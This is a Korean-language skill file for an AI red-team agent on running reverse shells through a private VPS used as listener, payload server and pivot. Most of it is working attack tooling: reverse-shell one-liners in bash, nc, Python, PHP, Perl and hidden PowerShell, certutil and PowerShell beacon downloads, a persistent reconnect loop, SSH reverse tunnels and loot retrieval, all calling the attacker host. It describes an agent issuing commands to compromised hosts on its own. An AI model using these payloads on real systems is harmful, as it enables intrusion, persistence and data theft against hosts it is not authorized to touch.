---
name: vps-reverse-shell
description: 자체 VPS(<VPS_IP>, SSH 개인 키 로그인)로 리버스 셸 착지와 중계: 9000-9999 포트 리스닝, 비대화형 세션 구동, 페이로드 전달, 역방향 터널
whenToUse: 대상이 로컬로 역접속할 수 없을 때 / 공인망 고정 리스닝 포트가 필요할 때 / 상시 온라인 점프 호스트가 필요할 때 / 에이전트가 직접 리버스 셸에 명령을 내려야 할 때
role: exploit
enabled: true
---

# VPS 중계와 리버스 셸(<VPS_IP>)

자체 공인망 VPS 를 **리버스 셸 착지단 + 페이로드 전달 지점 + 내부망 중계 점프 호스트**로 쓴다. 대상은 인터넷에 접근할 수 있으면 충분하고,
셸을 VPS 의 9000-9999 포트로 보내면 된다; 에이전트는 tmux 세션을 통해 **비대화형으로** 명령을 내리고 출력을 읽어 온다.

## 언제 쓰나 / 언제 쓰지 않나

| 상황 | 선택 |
| --- | --- |
| 대상이 로컬로 직접 접속 가능(같은 대역, 공인 IP 보유) | 로컬에서 바로 리스닝, VPS 는 **불필요** |
| 대상은 외부로만 나가고 로컬은 내부망(NAT 뒤) | ✅ VPS 사용. 이것이 주 시나리오 |
| 대상이 클라우드 호스트/컨테이너라 외부 통신이 제한적이지만 80/443 은 나감 | ✅ VPS 의 9000-9999 사용(제한되면 443/80 계열 포트, 문제 해결 절 참조) |
| 명령 한 줄만 돌려 결과를 얻으면 됨 | Web 취약점/RCE 의 HTTP 채널이 리버스 셸보다 안정적이고 은밀하다 |

## 자산과 자격 증명

```
호스트   : <VPS_IP> (Tencent Cloud, Ubuntu 24.04, 2C2G, 호스트명 <VPS 호스트명>)
사용자   : ubuntu (sudo 무암호)
개인 키  : ~/.dsh/redteam/toolkit/vps/id_rsa          ← 권한 600, 저장소/채팅에 복사하지 않는다
사용 포트: 9000-9999                                   ← 클라우드 보안 그룹이 이 구간만 열어 두었다
도구 스크립트: ~/.dsh/redteam/toolkit/vps/vps.sh
```

**키 규율**: 개인 키는 위 경로에만 둔다. 어떤 경우에도 개인 키 내용을 스킬 파일, 보고서, 저장소, 대화에 쓰지 않는다.

이미 장기 점유된 포트: **9001 / 9007 / 9009(그 밖에 9008 등 임시 서비스)**, 별도로 tmux 세션 `cap / sh / up / www` 가 있다.
**이들은 이번 드릴의 것이 아니다. 죽이지도, 덮어쓰지도 않는다.**

## 빠른 시작

```bash
VPS=~/.dsh/redteam/toolkit/vps/vps.sh

$VPS status                 # VPS 상태, 남은 포트, 현재 세션 확인
$VPS listen                 # 빈 포트를 자동으로 골라 리스닝 시작($VPS listen 9000 도 가능)
# → 포트를 받은 뒤 대상의 취약점으로 리버스 명령을 실행한다(다음 절 참조)
$VPS send 9000 'id; uname -a'      # 대상이 역접속한 뒤 명령 하달
$VPS read 9000 60                  # 출력 읽기
$VPS kill 9000                     # 사용 후 반드시 정리
```

`listen` 은 tmux + rlwrap + **자동 재리스닝 루프**를 쓴다: 연결이 끊기면 자동으로 다시 리스닝하므로 반복 트리거에 적합하다.

## 도구 사용법(vps.sh)

| 서브커맨드 | 역할 |
| --- | --- |
| `status` | VPS 신원, 시스템, 도구 준비 상태, 9000-9999 점유, tmux 세션 |
| `port` | 9000-9999 안의 빈 포트를 자동 반환 |
| `listen [port]` | 지속 리스닝 시작(포트 생략 시 자동 선택), 대상 측 명령 템플릿 출력 |
| `sessions` | VPS 의 tmux 세션 목록 |
| `send <port> '<cmd>'` | **이미 올라온 리버스 셸에 명령 하달**(에이전트 주 용도) |
| `read <port> [줄 수]` | 해당 세션의 최근 출력 읽기(기본 200줄) |
| `watch <port>` | 출력 지속 갱신(사람이 볼 때) |
| `attach <port>` | 로컬 tmux 로 세션 인계(사람용, `Ctrl-B D` 로 분리) |
| `kill <port>` | 리스너 종료 + 세션 정리 + 포트 반환 |
| `serve [port] [dir]` | VPS 에 HTTP 서비스 기동, 대상이 페이로드를 내려받게 함(기본 9008) |
| `push <로컬> [원격]` | 파일을 VPS 로 업로드 |
| `get <원격> [로컬]` | VPS 에서 파일 가져오기(대상 산출물 회수) |
| `sh '<명령>'` | VPS 에서 임의 명령 직접 실행 |

환경 변수로 덮어쓸 수 있다: `VPS_HOST`, `VPS_KEY`.

## 대상 측 리버스 payload(포트는 listen 한 그 포트로 바꾼다)

```bash
# Bash(가장 많이 쓴다)
bash -c 'bash -i >& /dev/tcp/<VPS_IP>/9000 0>&1'
bash -c 'exec bash -i &>/dev/tcp/<VPS_IP>/9000 <&1'

# nc 계열(-e 를 지원하는 버전)
nc <VPS_IP> 9000 -e /bin/bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <VPS_IP> 9000 > /tmp/f

# Python(nc 가 없을 때의 대안, python2/3 호환)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<VPS_IP>",9000));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'

# PHP(Web 측 getshell 후 흔히 쓴다)
php -r '$s=fsockopen("<VPS_IP>",9000);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="<VPS_IP>";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Windows PowerShell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<VPS_IP>',9000);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

**URL 인코딩**: Web 취약점(명령 인젝션/RCE)으로 보낼 때는 payload 전체를 URL 인코딩한 뒤 파라미터로 넘겨 `&`, `>` 가 잘리는 것을 피한다.

## 세션 업그레이드와 안정화

순수 `nc` 로 얻은 셸은 TTY 가 없다: `sudo` 를 쓸 수 없고 `su`, `vi`, `top` 이 비정상 동작한다. 업그레이드:

```bash
# 대상에서 실행(python3 가 가장 흔히 설치되어 있다)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 또는
script -qc /bin/bash /dev/null
```

```bash
# 로컬 측(attach 후) Ctrl-C/방향키가 정상 동작하게 한다
# 리버스 셸에서 차례로: Ctrl-Z
stty raw -echo; fg
# 엔터 두 번, 그다음
export TERM=xterm; export SHELL=/bin/bash; stty rows 40 cols 160
```

**더 안정적인 방법: socat 완전 TTY 리스닝**(VPS 에 socat 이 설치되어 있다):

```bash
$VPS sh "tmux new-session -d -s rt-pty -t '' 'socat file:\`tty\`,raw,echo=0 tcp-listen:9000,reuseaddr'"
# 대상 측
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<VPS_IP>:9000
```

끊기면 자동 재접속(대상 측 루프):

```bash
while true; do bash -c 'bash -i >& /dev/tcp/<VPS_IP>/9000 0>&1'; sleep 10; done &
```

## 페이로드 전달(VPS 를 파일 중계로 사용)

```bash
$VPS serve 9100 ~/rt/payloads        # VPS 에 HTTP 서비스 기동
$VPS push ./suo5 /home/ubuntu/rt/payloads/
# 대상 측(Linux)
curl -O http://<VPS_IP>:9100/suo5  또는  wget http://<VPS_IP>:9100/suo5
# 대상 측(Windows)
certutil -urlcache -split -f http://<VPS_IP>:9100/beacon.exe C:\Windows\Temp\a.exe
powershell -c "iwr http://<VPS_IP>:9100/beacon.exe -OutFile C:\Windows\Temp\a.exe"
```

**전리품 회수**: `$VPS get /home/ubuntu/rt/loot/dump.zip ~/.dsh/redteam/engagements/<표적>/runs/`

## 역방향 터널과 중계

대상이 내부망에 있고 로컬에서 도달할 수 없을 때 VPS 를 점프 호스트로 쓴다:

```bash
# 역방향 터널: VPS:9200 → 대상 내부망 10.0.0.5:8080 (대상에서 실행)
ssh -R 9200:10.0.0.5:8080 -N -f -o StrictHostKeyChecking=no -i <대상의 키> ubuntu@<VPS_IP>
# 이후 로컬에서 VPS 를 경유해 접근: ssh -L 8080:127.0.0.1:9200 ubuntu@<VPS_IP>

# socat 포트 포워딩(VPS 에서)
$VPS sh "tmux new-session -d -s fwd-9200 'socat TCP-LISTEN:9200,reuseaddr,fork TCP:10.0.0.5:8080'"
```

WebShell 상황에서는 스킬 `suo5-tunnel` 과 조합한다: suo5 클라이언트는 로컬에, 서버는 대상에 올리고, 터널 출구는 VPS 를 경유하면 더 안정적이다.

## 규율(반드시 지킨다)

1. **포트 규율**: 9000-9999 만 쓴다. 리스닝을 열기 전에 `$VPS port` 또는 `$VPS status` 로 비어 있는지 확인한다; **9001, 9007, 9009 와 `cap/sh/up/www` 세션을 점유하거나 죽이지 않는다**.
2. **사용 후에는 반드시 `$VPS kill <port>`**, 순수 리스너를 남기지 않는다(자원 점유이자 흔적이다).
3. **자격 증명은 DB 에 넣고 VPS 에 남기지 않는다**: 대상에서 얻은 비밀번호/해시는 `redteam_credential_add` 로 로컬 자산 DB 에 기록하고(평문 `secret_value`), 산출물은 로컬 `runs/` 에 둔다; **자격 증명을 VPS 홈 디렉터리에 쓰지 않는다**.
4. **VPS IP 는 대상에게 보인다**: 이번 드릴의 인프라에 속하므로, 대상에 그것 외의 추가 개인 정보를 남기지 않는다.
5. **DB 기록**: 셸을 얻을 때마다 `redteam_access_add` 로 기록하고(host/계정/방식/권한/세션 참조), 자격 증명마다 `redteam_credential_add` 로 기록하며, 공격 스크립트는 `redteam_attack_file_add` 로 보관한다.
6. **`send` 로 보낸 모든 명령은 `read` 출력에서 증거를 얻을 수 있어야 한다**. 중요한 출력은 먼저 파일로 리다이렉션한 뒤 `get` 으로 회수해 tmux 스크롤백 버퍼가 밀려 사라지는 것을 피한다.

## 문제 해결

| 증상 | 처리 |
| --- | --- |
| 대상이 역접속하지 못함 | 먼저 리스너가 실제로 살아 있는지 확인: `$VPS sessions` + `$VPS sh "ss -ltnp \| grep <port>"`; 다음으로 대상의 외부 통신 확인(대상에서 `curl -s http://<VPS_IP>:<port>` 가 연결 성공을 돌려주면 포트 도달 가능) |
| 포트가 범위 밖/포트 변경 | 클라우드 보안 그룹이 9000-9999 만 열어 두었다. 범위를 넘으면 반드시 실패한다 |
| 반복적으로 끊김 | 대상 측에 `while true` 재접속 루프를 넣거나 socat 완전 TTY 방식을 쓴다 |
| 응답은 있으나 명령이 실행되지 않음 | payload 가 URL 에서 잘렸다(`&`/`>`). 전체를 URL 인코딩한다 |
| 문자 깨짐 | 대상에서 `export LANG=C.UTF-8`, 또는 `read` 전에 tmux 설정 `tmux set -t rt-<port> utf8 on` |
| TTY 없음, `sudo` 오류 | PTY 로 업그레이드(위 참조) |
| 로컬에서 포트가 "전부 연결됨"으로 보임 | 로컬 게이트웨이가 임의 포트에 SYN-ACK 를 돌려준다. **로컬 `nc -z` 로는 VPS 포트 도달성을 판단할 수 없다**; 외부 노드나 대상 자체로 검증한다 |

## 다른 스킬과의 관계

- `suo5-tunnel`: WebShell → SOCKS5 터널, 출구를 이 VPS 로 보낼 수 있다
- `webshell-toolkit`: Behinder/Godzilla/AntSword, WebShell 확보 후 관리
- `cn-proxy-pool`: 국내 출구 IP 가 필요할 때 프록시를 겹쳐 쓴다(로컬 네트워크 설정은 바꾸지 않는다)
- `active-scan` / `fofa-recon`: 내부망 도달 후 계속 자산 매핑
